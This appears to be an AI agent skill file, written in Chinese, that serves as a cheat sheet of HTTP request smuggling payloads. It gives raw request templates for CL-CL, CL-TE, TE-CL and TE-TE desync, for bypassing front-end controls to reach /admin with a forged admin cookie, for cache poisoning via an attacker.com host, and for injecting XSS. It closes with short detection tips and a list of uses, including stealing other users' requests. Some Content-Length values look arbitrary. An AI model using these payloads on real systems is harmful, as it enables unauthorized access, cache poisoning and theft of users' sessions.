---
name: http请求走私
description: Use when encountering http请求走私攻击 - cl-cl、cl-te、te-cl、te-te攻击链
---

# HTTP请求走私

## Info

- **Domain**: web
- **Tags**: web, smuggling

## CL-CL (Content-Length差异)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 44

GET /admin HTTP/1.1
Host: target.com


```

## CL-TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE-CL
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0


```

## TE-TE
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

G
```

## 绕过前端安全
```
POST / HTTP/1.1
Host: target.com
Content-Length: 60

GET /admin HTTP/1.1
Host: target.com
Cookie: session=admin


```

## 缓存投毒
```
POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /static.js HTTP/1.1
Host: attacker.com
X-Inject: alert(1)


```

## 组合XSS
```
POST / HTTP/1.1
Host: target.com
Content-Length: 100

POST /comment HTTP/1.1
Host: target.com
Content-Length: 50

content=<script>alert(1)</script>
```

## 检测方法
```bash
# 使用Burp Suite
# 1. HTTP Request Smuggler插件
# 2. 手动发送不同Content-Length/TE的请求

# 时间差异检测
# 发送CL-TE请求，观察响应时间
```

## 常见利用场景
```
1. 绕过前端认证
2. 缓存投毒
3. 触发XSS
4. 窃取其他用户请求
5. 内网端口扫描
```